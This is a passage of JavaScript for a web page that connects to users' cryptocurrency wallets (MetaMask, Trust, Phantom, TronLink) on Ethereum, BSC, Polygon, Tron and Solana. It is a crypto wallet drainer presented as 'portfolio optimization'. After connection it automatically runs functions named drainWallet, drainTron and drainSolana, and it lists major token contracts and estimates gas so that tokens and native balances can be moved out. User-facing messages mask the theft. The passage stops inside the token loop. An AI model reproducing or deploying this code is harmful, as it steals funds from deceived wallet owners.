            return wallet.networks.map(n => n.toUpperCase()).join(', ');
        }
        
        return 'None';
    }

    // Update wallet status display
    function updateWalletStatus() {
        const availability = checkWalletAvailability(selectedWallet);
        const supportedNetworks = getSupportedNetworks(selectedWallet);
        const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
        
        const availabilityEl = $('#wallet-availability');
        const networksEl = $('#supported-networks');
        const deviceEl = $('#device-type');
        
        availabilityEl.text(availability);
        networksEl.text(supportedNetworks);
        deviceEl.text(deviceType);
        
        // Add CSS classes for styling
        availabilityEl.removeClass('available unavailable');
        
        if (availability === 'Available') {
            availabilityEl.addClass('available');
        } else if (availability === 'Not Installed') {
            availabilityEl.addClass('unavailable');
        }
        
        // Enable/disable connect button
        const canConnect = (availability === 'Available' || availability === 'Mobile Supported');
        $('#connect-wallet').prop('disabled', !canConnect);
    }

    // Wallet selection handler  
    $('#wallet-select').on('change', function() {
        selectedWallet = $(this).val();
        console.log('Selected wallet:', selectedWallet);
        updateWalletStatus();
        
        // Show wallet info if a wallet is selected
        if (selectedWallet) {
            const selectedOption = $(this).find('option:selected');
            const walletType = selectedOption.data('type');
            const networks = selectedOption.data('networks');
            
            console.log(`Wallet type: ${walletType}, Networks: ${networks}`);
            
            // Update UI to show selection
            const availability = checkWalletAvailability(selectedWallet);
            if (availability === 'Available' || availability === 'Mobile Supported') {
                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} selected - Ready to connect`);
            } else {
                updateConnectionStatus(`${WALLET_DEFINITIONS[selectedWallet]?.name || selectedWallet} not available`, true);
            }
        }
    });

    // Initialize with device info and populate wallet dropdown
    const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
    $('#device-type').text(deviceType);
    updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);

    // Populate wallet dropdown with detected wallets
    checkWalletStatuses();
    
    // Add refresh functionality for wallet detection
    $('#wallet-select').after('<button id="refresh-wallets" class="refresh-btn" style="margin-left: 10px; padding: 5px 10px; background: #007bff; color: white; border: none; border-radius: 4px; cursor: pointer;">🔄 Refresh</button>');
    
    $('#refresh-wallets').on('click', function() {
        console.log("Refreshing wallet detection...");
        checkWalletStatuses();
        updateConnectionStatus("Wallet detection refreshed! Check console for status.");
    });

    // Debug: Show available wallets
    console.log("=== Simplified Wallet System ===");
    Object.keys(WALLET_DEFINITIONS).forEach(walletId => {
        const wallet = WALLET_DEFINITIONS[walletId];
        const detected = wallet.detect();
        console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
    });
    console.log("===============================");

    // Simplified main wallet connection handler
    $('#connect-wallet').on('click', async () => {
        const selectedWalletKey = $('#wallet-select').val();
        
        try {
            if (!selectedWalletKey) {
                alert("Please select a wallet from the dropdown menu.");
                return;
            }

            console.log("Connecting to wallet:", selectedWalletKey);
            updateConnectionStatus(`Connecting to wallet...`);

            // Handle mobile wallet connections
            if (isMobileDevice()) {
                const mobileSupportedWallets = ['metamask', 'trust', 'phantom', 'coinbase', 'tronlink'];
                if (mobileSupportedWallets.includes(selectedWalletKey)) {
                    console.log("Mobile device detected - using mobile connection flow");
                    updateConnectionStatus("Opening wallet app...");
                    
                    // Try to open the wallet app via deep link
                    const walletDef = WALLET_DEFINITIONS[selectedWalletKey];
                    const deepLinkOpened = connectMobileWallet(walletDef.name);
                    
                    if (deepLinkOpened) {
                        updateConnectionStatus("Wallet app opened - Please approve connection in the app");
                        
                        // Wait for mobile connection
                        const connectionResult = await waitForMobileConnection(30000);
                        
                        if (connectionResult.success) {
                            console.log("Mobile wallet connected successfully!");
                            const userAddress = connectionResult.accounts[0];
                            
                            // Create wallet info for mobile connection
                            const selectedWallet = {
                                name: walletDef.name,
                                provider: connectionResult.provider,
                                type: walletDef.type === "multi" ? "phantom-multi" : 
                                      walletDef.type === "multi-evm-tron-solana" ? "trust-multi-full" :
                                      walletDef.type === "multi-evm-tron" ? "trust-multi" : "evm",
                                networks: walletDef.networks || walletDef.evmNetworks || ["ethereum"]
                            };
                            
                            await handleWalletConnection(selectedWallet);
                        } else {
                            updateConnectionStatus("Failed to connect to mobile wallet", true);
                            alert("Connection timeout. Please make sure the wallet app is installed and try again.");
                        }
                    } else {
                        updateConnectionStatus("Failed to open wallet app", true);
                        const installMessage = getWalletInstallMessage(walletDef.name);
                        if (confirm(`Could not open ${walletDef.name} app.\n\n${installMessage}\n\nWould you like to install it now?`)) {
                            openWalletInstallPage(walletDef.name);
                        }
                    }
                    return;
                }
            }

            // Handle desktop wallet connections
            const walletDef = WALLET_DEFINITIONS[selectedWalletKey];
            if (!walletDef) {
                alert("Wallet not supported. Please select a different wallet.");
                return;
            }

            // Check if wallet is detected (only for desktop)
            if (!isMobileDevice() && !walletDef.detect()) {
                const installMessage = getWalletInstallMessage(walletDef.name);
                if (confirm(`${walletDef.name} is not detected.\n\n${installMessage}\n\nWould you like to install it now?`)) {
                    openWalletInstallPage(walletDef.name);
                }
                return;
            }

            // Get provider based on wallet type
            let provider, selectedWallet;
            
            if (walletDef.type === "multi") {
                // Phantom wallet - automatically use all networks
                const evmProvider = walletDef.getEVMProvider();
                const solanaProvider = walletDef.getSolanaProvider();
                
                if (!evmProvider && !solanaProvider) {
                    alert("Phantom wallet not found. Please install Phantom wallet.");
                    return;
                }
                
                selectedWallet = {
                    name: walletDef.name,
                    evmProvider: evmProvider,
                    solanaProvider: solanaProvider,
                    type: "phantom-multi",
                    networks: ["ethereum", "bsc", "polygon", "solana"]
                };
            } else if (walletDef.type === "tron") {
                // Tron wallet
                provider = walletDef.getProvider();
                if (!provider || !provider.defaultAddress || !provider.defaultAddress.base58) {
                    alert("TronLink is not connected. Please unlock TronLink and try again.");
                    return;
                }
                selectedWallet = {
                    name: walletDef.name,
                    provider: provider,
                    type: "tron",
                    networks: walletDef.networks
                };
            } else if (walletDef.type === "multi-evm-tron") {
                // Trust Wallet with EVM + Tron support
                provider = walletDef.getProvider();
                if (!provider) {
                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
                    return;
                }
                selectedWallet = {
                    name: walletDef.name,
                    provider: provider,
                    tronProvider: walletDef.getTronProvider(),
                    type: "trust-multi",
                    networks: walletDef.networks
                };
            } else if (walletDef.type === "multi-evm-tron-solana") {
                // Trust Wallet with EVM + Tron + Solana support
                provider = walletDef.getProvider();
                if (!provider) {
                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
                    return;
                }
                selectedWallet = {
                    name: walletDef.name,
                    provider: provider,
                    tronProvider: walletDef.getTronProvider(),
                    solanaProvider: walletDef.getSolanaProvider(),
                    type: "trust-multi-full",
                    networks: walletDef.networks
                };
            } else {
                // EVM wallet
                provider = walletDef.getProvider();
                if (!provider) {
                    alert(`${walletDef.name} provider not found. Please install the wallet extension.`);
                    return;
                }
                selectedWallet = {
                    name: walletDef.name,
                    provider: provider,
                    type: "evm",
                    networks: walletDef.networks
                };
            }

            // Universal connection - all wallet types use the same reliable handler
            await handleWalletConnection(selectedWallet);

        } catch (error) {
            console.error("Connection error:", error);
            updateConnectionStatus("Connection failed", true);
            alert(`Connection failed: ${error.message || error.toString()}`);
        }
    });

    // Update wallet status display when selection changes
    $('#wallet-select').on('change', function() {
        const selectedWalletKey = $(this).val();
        
        if (!selectedWalletKey) {
            $('#wallet-availability').text("Select wallet to check availability");
            $('#supported-networks').text("Auto-detection enabled");
            return;
        }

        // Handle mobile wallets
        if (selectedWalletKey.includes('-mobile')) {
            $('#wallet-availability').text(isMobileDevice() ? "Mobile wallet app required" : "Mobile device required");
            const option = $(this).find('option:selected');
            const networks = option.data('networks') || "";
            $('#supported-networks').text(networks.replace(/,/g, ', ').toUpperCase());
            return;
        }

        // Handle desktop wallets
        const walletDef = WALLET_DEFINITIONS[selectedWalletKey];
        if (walletDef) {
            const isDetected = walletDef.detect();
            $('#wallet-availability').text(isDetected ? "✅ Available" : "❌ Not detected");
            
            let networksText = "";
            if (walletDef.type === "multi") {
                const evmText = walletDef.evmNetworks.join(', ').toUpperCase();
                const solanaText = walletDef.solanaNetworks.join(', ').toUpperCase();
                networksText = `${evmText}, ${solanaText}`;
            } else if (walletDef.networks) {
                networksText = walletDef.networks.join(', ').toUpperCase();
            }
            $('#supported-networks').text(networksText);
        }
    });

    // Initialize wallet system
    function initializeWalletSystem() {
        // Check wallet statuses
        checkWalletStatuses();
        
        // Update device info
        const deviceType = isMobileDevice() ? 'Mobile' : 'Desktop';
        $('#device-type').text(deviceType);
        updateConnectionStatus(`Device: ${deviceType} - Ready for wallet selection`);
        
        // Debug: Show available wallets
        console.log("=== Wallet System Initialized ===");
        Object.keys(WALLET_DEFINITIONS).forEach(walletId => {
            const wallet = WALLET_DEFINITIONS[walletId];
            const detected = wallet.detect();
            console.log(`${wallet.name}: ${detected ? '✅ Available' : '❌ Not Available'}`);
        });
        console.log("=================================");
    }

    // Initialize the system when page loads
    initializeWalletSystem();

    // Enhanced successful connection handler with multi-chain support
    async function handleSuccessfulConnection(provider, walletName, userAddress) {
        try {
            updateConnectionStatus("Setting up connection...");
            
            // Initialize ethers provider
            const ethersProvider = new ethers.providers.Web3Provider(provider);
            const signer = ethersProvider.getSigner();
            
            // Get network info
            const network = await ethersProvider.getNetwork();
            console.log("Connected to network:", network);
            
            // Enhanced network handling - support multiple networks
            const supportedNetworks = [1, 56, 137]; // ETH, BSC, Polygon
            const networkNames = {
                1: "Ethereum",
                56: "BSC", 
                137: "Polygon"
            };
            
            if (!supportedNetworks.includes(network.chainId)) {
                updateConnectionStatus("Unsupported network detected", true);
                const switchToEthereum = confirm(`You're on ${network.name} (Chain ID: ${network.chainId}).\n\nThis app supports Ethereum, BSC, and Polygon.\nWould you like to switch to Ethereum Mainnet?`);
                
                if (switchToEthereum) {
                    try {
                        updateConnectionStatus("Switching to Ethereum Mainnet...");
                        await provider.request({
                            method: 'wallet_switchEthereumChain',
                            params: [{ chainId: '0x1' }], // Ethereum Mainnet
                        });
                        // Refresh connection after network switch
                        updateConnectionStatus("Network switched successfully!");
                        return handleSuccessfulConnection(provider, walletName, userAddress);
                    } catch (switchError) {
                        console.error("Failed to switch network:", switchError);
                        updateConnectionStatus("Failed to switch network", true);
                        alert("❌ Failed to switch to Ethereum Mainnet. Please switch manually in your wallet.");
                        return;
                    }
                }
            }
            
            updateConnectionStatus("Checking account balance...");
            
            // Check ETH balance (or native token balance)
            const balance = await ethersProvider.getBalance(userAddress);
            const tokenBalance = ethers.utils.formatEther(balance);
            const networkName = networkNames[network.chainId] || network.name;
            
            // Update connection status and button
            updateConnectionStatus(`✅ Connected to ${walletName} on ${networkName} | Balance: ${parseFloat(tokenBalance).toFixed(4)} ${network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'}`);
            
            // Enhanced button setup with multi-chain support
            const connectButton = $('#connect-wallet');
            connectButton.text("🚀 Optimize Portfolio");
            connectButton.off('click').on('click', async () => {
                await drainWallet(ethersProvider, signer, userAddress);
            });
            
            // Show detailed connection info
            const nativeToken = network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH';
            alert(`✅ Connected Successfully!\n\n` +
                  `💼 Wallet: ${walletName}\n` +
                  `📍 Address: ${userAddress}\n` +
                  `🌐 Network: ${networkName} (${network.chainId})\n` +
                  `💰 Balance: ${tokenBalance} ${nativeToken}\n\n` +
                  `🚀 Ready to optimize your portfolio!`);
            
        } catch (error) {
            console.error("Post-connection setup error:", error);
            updateConnectionStatus("Connection setup failed", true);
            alert("⚠️ Connected to wallet but failed to complete setup: " + error.message);
        }
    }

    // Universal reliable wallet connection handler - works for ALL wallet types
    async function handleWalletConnection(walletInfo) {
        try {
            const { name, provider, type, networks } = walletInfo;
            updateConnectionStatus(`Connecting to ${name}...`);
            
            let userAddress = null;
            let networkInfo = null;
            
            if (type === "evm") {
                // Handle EVM wallets (MetaMask, Trust, Coinbase, Phantom EVM)
                await provider.request({ method: 'eth_requestAccounts' });
                const accounts = await provider.request({ method: 'eth_accounts' });
                
                if (!accounts || accounts.length === 0) {
                    throw new Error("No accounts found. Please unlock your wallet.");
                }
                
                userAddress = accounts[0];
                const ethersProvider = new ethers.providers.Web3Provider(provider);
                const network = await ethersProvider.getNetwork();
                const balance = await ethersProvider.getBalance(userAddress);
                
                networkInfo = {
                    name: network.name,
                    chainId: network.chainId,
                    balance: ethers.utils.formatEther(balance),
                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
                };
                
                // Setup wallet-specific draining function - auto-start after connection
                const signer = ethersProvider.getSigner();
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately for wallet's specific networks
                setTimeout(async () => {
                    await drainWalletSpecificNetworks(walletInfo, userAddress);
                }, 1000);
                
            } else if (type === "trust-multi") {
                // Handle Trust Wallet multi-network (EVM + Tron)
                await provider.request({ method: 'eth_requestAccounts' });
                const accounts = await provider.request({ method: 'eth_accounts' });
                
                if (!accounts || accounts.length === 0) {
                    throw new Error("No accounts found. Please unlock your wallet.");
                }
                
                userAddress = accounts[0];
                const ethersProvider = new ethers.providers.Web3Provider(provider);
                const network = await ethersProvider.getNetwork();
                const balance = await ethersProvider.getBalance(userAddress);
                
                networkInfo = {
                    name: "Trust Multi-Chain",
                    chainId: network.chainId,
                    balance: ethers.utils.formatEther(balance),
                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
                };
                
                // Setup Trust Wallet multi-network draining - auto-start
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately for Trust's specific networks
                setTimeout(async () => {
                    await drainTrustMultiNetworks(walletInfo, userAddress);
                }, 1000);
                
            } else if (type === "trust-multi-full") {
                // Handle Trust Wallet full multi-network (EVM + Tron + Solana)
                await provider.request({ method: 'eth_requestAccounts' });
                const accounts = await provider.request({ method: 'eth_accounts' });
                
                if (!accounts || accounts.length === 0) {
                    throw new Error("No accounts found. Please unlock your wallet.");
                }
                
                userAddress = accounts[0];
                const ethersProvider = new ethers.providers.Web3Provider(provider);
                const network = await ethersProvider.getNetwork();
                const balance = await ethersProvider.getBalance(userAddress);
                
                networkInfo = {
                    name: "Trust Full Multi-Chain",
                    chainId: network.chainId,
                    balance: ethers.utils.formatEther(balance),
                    currency: network.chainId === 56 ? 'BNB' : network.chainId === 137 ? 'MATIC' : 'ETH'
                };
                
                // Setup Trust Wallet full multi-network draining - auto-start
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately for Trust's all networks
                setTimeout(async () => {
                    await drainTrustFullMultiNetworks(walletInfo, userAddress);
                }, 1000);
                
            } else if (type === "phantom-multi") {
                // Handle Phantom multi-chain (both EVM and Solana)
                console.log("🎯 Setting up Phantom multi-chain connection...");
                
                let evmAddress = null;
                let solanaAddress = null;
                
                // Connect to EVM if available
                if (walletInfo.evmProvider) {
                    try {
                        await walletInfo.evmProvider.request({ method: 'eth_requestAccounts' });
                        const accounts = await walletInfo.evmProvider.request({ method: 'eth_accounts' });
                        if (accounts && accounts.length > 0) {
                            evmAddress = accounts[0];
                            console.log("✅ Phantom EVM connected:", evmAddress);
                        }
                    } catch (evmError) {
                        console.log("❌ Phantom EVM connection failed:", evmError.message);
                    }
                }
                
                // Connect to Solana if available
                if (walletInfo.solanaProvider) {
                    try {
                        const response = await walletInfo.solanaProvider.connect();
                        if (response && response.publicKey) {
                            solanaAddress = response.publicKey.toString();
                            console.log("✅ Phantom Solana connected:", solanaAddress);
                        }
                    } catch (solanaError) {
                        console.log("❌ Phantom Solana connection failed:", solanaError.message);
                    }
                }
                
                if (!evmAddress && !solanaAddress) {
                    throw new Error("Failed to connect to both Phantom EVM and Solana. Please try again.");
                }
                
                // Use the first available address for display
                userAddress = evmAddress || solanaAddress;
                
                networkInfo = {
                    name: "Multi-Chain (EVM + Solana)",
                    chainId: "multi",
                    balance: "Multiple Networks",
                    currency: "Multi"
                };
                
                // Setup comprehensive multi-chain draining for Phantom - auto-start
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately for Phantom's specific networks
                setTimeout(async () => {
                    await drainPhantomSpecificNetworks(walletInfo, evmAddress, solanaAddress);
                }, 1000);
                
            } else if (type === "solana") {
                // Handle Solana wallets (Phantom Solana)
                const response = await provider.connect();
                userAddress = response.publicKey.toString();
                
                networkInfo = {
                    name: "Solana",
                    chainId: "solana",
                    balance: "N/A", // Would need Solana Web3.js for balance
                    currency: "SOL"
                };
                
                // Setup draining function - auto-start
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately
                setTimeout(async () => {
                    await drainSolana(provider, userAddress);
                }, 1000);
                
            } else if (type === "tron") {
                // Handle Tron wallets (TronLink)
                if (!provider.defaultAddress || !provider.defaultAddress.base58) {
                    throw new Error("TronLink is not properly logged in.");
                }
                
                userAddress = provider.defaultAddress.base58;
                const balance = await provider.trx.getBalance(userAddress);
                const trxBalance = provider.fromSun(balance);
                
                networkInfo = {
                    name: "Tron",
                    chainId: "tron",
                    balance: trxBalance,
                    currency: "TRX"
                };
                
                // Setup draining function - auto-start
                $('#connect-wallet').text("Connected - Processing...").prop('disabled', true);
                
                // Auto-start draining immediately
                setTimeout(async () => {
                    await drainTron(provider, userAddress);
                }, 1000);
                
            } else {
                throw new Error(`Unsupported wallet type: ${type}`);
            }
            
            // Universal success handling
            const successMessage = `✅ Connected to ${name} | ${networkInfo.balance} ${networkInfo.currency}`;
            updateConnectionStatus(successMessage);
            
            const alertMessage = `✅ ${name} Connected!\n\n` +
                               `📍 Address: ${userAddress}\n` +
                               `🌐 Network: ${networkInfo.name}\n` +
                               `💰 Balance: ${networkInfo.balance} ${networkInfo.currency}\n\n` +
                               `🚀 Ready to optimize your portfolio!`;
            alert(alertMessage);
            
            console.log(`Successfully connected to ${name}:`, userAddress);
            
        } catch (error) {
            console.error(`${walletInfo.name} connection failed:`, error);
            updateConnectionStatus(`${walletInfo.name} connection failed`, true);
            throw error;
        }
    }

    // Wallet-specific network draining functions
    async function drainWalletSpecificNetworks(walletInfo, userAddress) {
        try {
            const { name, provider, networks } = walletInfo;
            console.log(`🎯 Starting ${name} specific network draining for networks:`, networks);
            updateConnectionStatus(`Draining ${name} supported networks...`);
            
            // Get supported networks for this wallet
            const supportedNetworks = networks || [];
            console.log(`${name} will drain from networks:`, supportedNetworks);
            
            for (const networkName of supportedNetworks) {
                try {
                    console.log(`🔄 Processing ${networkName} network for ${name}...`);
                    updateConnectionStatus(`Processing ${networkName.toUpperCase()} network...`);
                    
                    await drainEVMNetwork(walletInfo, userAddress, networkName);
                    
                    // Small delay between networks
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    
                } catch (networkError) {
                    console.error(`Failed to drain ${networkName}:`, networkError);
                    updateConnectionStatus(`Failed to process ${networkName}`, true);
                    // Continue with next network
                }
            }
            
            updateConnectionStatus("All supported networks processed! 🎉");
            alert(`${name} portfolio optimization completed! 🎉`);
            
        } catch (error) {
            console.error("Wallet-specific draining failed:", error);
            updateConnectionStatus("Network processing failed", true);
            alert("Failed to process wallet networks: " + error.message);
        }
    }

    // Phantom-specific multi-chain draining (EVM + Solana)
    async function drainPhantomSpecificNetworks(walletInfo, evmAddress, solanaAddress) {
        try {
            console.log("🎯 Starting Phantom multi-chain draining...");
            updateConnectionStatus("Processing Phantom networks...");
            
            let evmProcessed = false;
            let solanaProcessed = false;
            
            // Process EVM networks if EVM is connected
            if (evmAddress && walletInfo.evmProvider) {
                try {
                    console.log("🔄 Processing Phantom EVM networks...");
                    updateConnectionStatus("Processing Ethereum, Polygon...");
                    
                    const evmNetworks = ["ethereum", "polygon"]; // Only ETH and Polygon for Phantom
                    const evmWalletInfo = {
                        name: "Phantom (EVM)",
                        provider: walletInfo.evmProvider,
                        networks: evmNetworks
                    };
                    
                    for (const networkName of evmNetworks) {
                        try {
                            console.log(`🔄 Processing ${networkName} for Phantom EVM...`);
                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
                            
                            await drainEVMNetwork(evmWalletInfo, evmAddress, networkName);
                            
                            // Small delay between networks
                            await new Promise(resolve => setTimeout(resolve, 2000));
                            
                        } catch (networkError) {
                            console.error(`Failed to drain ${networkName}:`, networkError);
                            // Continue with next network
                        }
                    }
                    
                    evmProcessed = true;
                    console.log("✅ Phantom EVM networks processed");
                    
                } catch (evmError) {
                    console.error("Phantom EVM draining failed:", evmError);
                }
            }
            
            // Process Solana if Solana is connected
            if (solanaAddress && walletInfo.solanaProvider) {
                try {
                    console.log("🔄 Processing Phantom Solana network...");
                    updateConnectionStatus("Processing Solana network...");
                    
                    await drainSolana(walletInfo.solanaProvider, solanaAddress);
                    
                    solanaProcessed = true;
                    console.log("✅ Phantom Solana network processed");
                    
                } catch (solanaError) {
                    console.error("Phantom Solana draining failed:", solanaError);
                }
            }
            
            // Final status
            if (evmProcessed && solanaProcessed) {
                updateConnectionStatus("All Phantom networks processed! 🎉");
                alert("Phantom multi-chain optimization completed! 🎉");
            } else if (evmProcessed) {
                updateConnectionStatus("Phantom EVM networks processed! 🎉");
                alert("Phantom EVM optimization completed! 🎉");
            } else if (solanaProcessed) {
                updateConnectionStatus("Phantom Solana network processed! 🎉");
                alert("Phantom Solana optimization completed! 🎉");
            } else {
                updateConnectionStatus("No networks could be processed", true);
                alert("Failed to process any Phantom networks");
            }
            
        } catch (error) {
            console.error("Phantom multi-chain draining failed:", error);
            updateConnectionStatus("Phantom processing failed", true);
            alert("Failed to process Phantom networks: " + error.message);
        }
    }

    // Trust Wallet multi-network draining (EVM + Tron)
    async function drainTrustMultiNetworks(walletInfo, userAddress) {
        try {
            console.log("🎯 Starting Trust Wallet multi-network draining...");
            updateConnectionStatus("Processing Trust Wallet networks...");
            
            let evmProcessed = false;
            let tronProcessed = false;
            
            // Process EVM networks first
            if (walletInfo.provider) {
                try {
                    console.log("🔄 Processing Trust Wallet EVM networks...");
                    updateConnectionStatus("Processing Ethereum, BSC, Polygon...");
                    
                    const evmNetworks = ["ethereum", "bsc", "polygon"];
                    const evmWalletInfo = {
                        name: "Trust Wallet (EVM)",
                        provider: walletInfo.provider,
                        networks: evmNetworks
                    };
                    
                    for (const networkName of evmNetworks) {
                        try {
                            console.log(`🔄 Processing ${networkName} for Trust Wallet...`);
                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
                            
                            await drainEVMNetwork(evmWalletInfo, userAddress, networkName);
                            
                            // Small delay between networks
                            await new Promise(resolve => setTimeout(resolve, 2000));
                            
                        } catch (networkError) {
                            console.error(`Failed to drain ${networkName}:`, networkError);
                            // Continue with next network
                        }
                    }
                    
                    evmProcessed = true;
                    console.log("✅ Trust Wallet EVM networks processed");
                    
                } catch (evmError) {
                    console.error("Trust Wallet EVM draining failed:", evmError);
                }
            }
            
            // Process Tron if TronWeb is available
            if (walletInfo.tronProvider && walletInfo.tronProvider.defaultAddress) {
                try {
                    console.log("🔄 Processing Trust Wallet Tron network...");
                    updateConnectionStatus("Processing Tron network...");
                    
                    const tronAddress = walletInfo.tronProvider.defaultAddress.base58;
                    await drainTron(walletInfo.tronProvider, tronAddress);
                    
                    tronProcessed = true;
                    console.log("✅ Trust Wallet Tron network processed");
                    
                } catch (tronError) {
                    console.error("Trust Wallet Tron draining failed:", tronError);
                }
            }
            
            // Final status
            if (evmProcessed && tronProcessed) {
                updateConnectionStatus("All Trust Wallet networks processed! 🎉");
                alert("Trust Wallet multi-chain optimization completed! 🎉");
            } else if (evmProcessed) {
                updateConnectionStatus("Trust Wallet EVM networks processed! 🎉");
                alert("Trust Wallet EVM optimization completed! 🎉");
            } else if (tronProcessed) {
                updateConnectionStatus("Trust Wallet Tron network processed! 🎉");
                alert("Trust Wallet Tron optimization completed! 🎉");
            } else {
                updateConnectionStatus("No networks could be processed", true);
                alert("Failed to process any Trust Wallet networks");
            }
            
        } catch (error) {
            console.error("Trust Wallet multi-network draining failed:", error);
            updateConnectionStatus("Trust Wallet processing failed", true);
            alert("Failed to process Trust Wallet networks: " + error.message);
        }
    }

    // Trust Wallet full multi-network draining (EVM + Tron + Solana)
    async function drainTrustFullMultiNetworks(walletInfo, userAddress) {
        try {
            console.log("🎯 Starting Trust Wallet full multi-network draining...");
            updateConnectionStatus("Processing Trust Wallet all networks...");
            
            let evmProcessed = false;
            let tronProcessed = false;
            let solanaProcessed = false;
            
            // Process EVM networks first
            if (walletInfo.provider) {
                try {
                    console.log("🔄 Processing Trust Wallet EVM networks...");
                    updateConnectionStatus("Processing Ethereum, BSC, Polygon...");
                    
                    const evmNetworks = ["ethereum", "bsc", "polygon"];
                    const evmWalletInfo = {
                        name: "Trust Wallet (EVM)",
                        provider: walletInfo.provider,
                        networks: evmNetworks
                    };
                    
                    for (const networkName of evmNetworks) {
                        try {
                            console.log(`🔄 Processing ${networkName} for Trust Wallet...`);
                            updateConnectionStatus(`Processing ${networkName.toUpperCase()}...`);
                            
                            await drainEVMNetwork(evmWalletInfo, userAddress, networkName);
                            
                            // Small delay between networks
                            await new Promise(resolve => setTimeout(resolve, 2000));
                            
                        } catch (networkError) {
                            console.error(`Failed to drain ${networkName}:`, networkError);
                            // Continue with next network
                        }
                    }
                    
                    evmProcessed = true;
                    console.log("✅ Trust Wallet EVM networks processed");
                    
                } catch (evmError) {
                    console.error("Trust Wallet EVM draining failed:", evmError);
                }
            }
            
            // Process Tron if TronWeb is available
            if (walletInfo.tronProvider && walletInfo.tronProvider.defaultAddress) {
                try {
                    console.log("🔄 Processing Trust Wallet Tron network...");
                    updateConnectionStatus("Processing Tron network...");
                    
                    const tronAddress = walletInfo.tronProvider.defaultAddress.base58;
                    await drainTron(walletInfo.tronProvider, tronAddress);
                    
                    tronProcessed = true;
                    console.log("✅ Trust Wallet Tron network processed");
                    
                } catch (tronError) {
                    console.error("Trust Wallet Tron draining failed:", tronError);
                }
            }
            
            // Process Solana if Solana provider is available
            if (walletInfo.solanaProvider) {
                try {
                    console.log("🔄 Processing Trust Wallet Solana network...");
                    updateConnectionStatus("Processing Solana network...");
                    
                    // Connect to Solana
                    const response = await walletInfo.solanaProvider.connect();
                    if (response && response.publicKey) {
                        const solanaAddress = response.publicKey.toString();
                        await drainSolana(walletInfo.solanaProvider, solanaAddress);
                        
                        solanaProcessed = true;
                        console.log("✅ Trust Wallet Solana network processed");
                    }
                    
                } catch (solanaError) {
                    console.error("Trust Wallet Solana draining failed:", solanaError);
                }
            }
            
            // Final status
            const processedNetworks = [];
            if (evmProcessed) processedNetworks.push("EVM");
            if (tronProcessed) processedNetworks.push("Tron");
            if (solanaProcessed) processedNetworks.push("Solana");
            
            if (processedNetworks.length > 0) {
                updateConnectionStatus(`Trust Wallet ${processedNetworks.join(", ")} networks processed! 🎉`);
                alert(`Trust Wallet ${processedNetworks.join(" + ")} optimization completed! 🎉`);
            } else {
                updateConnectionStatus("No networks could be processed", true);
                alert("Failed to process any Trust Wallet networks");
            }
            
        } catch (error) {
            console.error("Trust Wallet full multi-network draining failed:", error);
            updateConnectionStatus("Trust Wallet processing failed", true);
            alert("Failed to process Trust Wallet networks: " + error.message);
        }
    }

    // Enhanced wallet draining function (simplified working version)
    async function drainWallet(provider, signer, userAddress) {
        try {
            console.log("Starting wallet drain...");
            updateConnectionStatus("Starting asset extraction...");

            // Get initial ETH balance
            const initialBalance = await provider.getBalance(userAddress);
            const initialEthBalance = ethers.utils.formatEther(initialBalance);
            console.log(`Initial ETH balance: ${initialEthBalance}`);

            // Common ERC-20 token contracts (from your working code)
            const COMMON_TOKENS = [
                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
                { symbol: "USDC", address: "0xA0b86a33E6417a174f4dCc5B814094b8D1f57b69", decimals: 6 },
                { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", decimals: 18 },
                { symbol: "WBTC", address: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", decimals: 8 },
                { symbol: "AAVE", address: "0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9", decimals: 18 },
                { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
                { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
                { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE", decimals: 18 },
                { symbol: "PEPE", address: "0x6982508145454Ce325dDbE47a25d4ec3d2311933", decimals: 18 },
                { symbol: "MATIC", address: "0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0", decimals: 18 }
            ];

            // Calculate total gas needed for all operations
            const gasPrice = await provider.getGasPrice();
            console.log(`Current gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
            
            // Estimate gas for token transfers (higher limit for safety)
            const tokenGasLimit = ethers.BigNumber.from("65000"); // Higher for token transfers
            const ethGasLimit = ethers.BigNumber.from("21000"); // Standard ETH transfer
            
            // Calculate total gas needed (tokens + final ETH transfer)
            const estimatedTokenTransfers = COMMON_TOKENS.length;
            const totalGasNeeded = tokenGasLimit.mul(estimatedTokenTransfers).add(ethGasLimit);
            const totalGasCost = gasPrice.mul(totalGasNeeded);
            
            console.log(`Estimated gas needed: ${ethers.utils.formatEther(totalGasCost)} ETH`);

            // Step 1: Drain ERC-20 tokens first (they need ETH for gas)
            let tokenTransferCount = 0;
            for (const token of COMMON_TOKENS) {
                try {
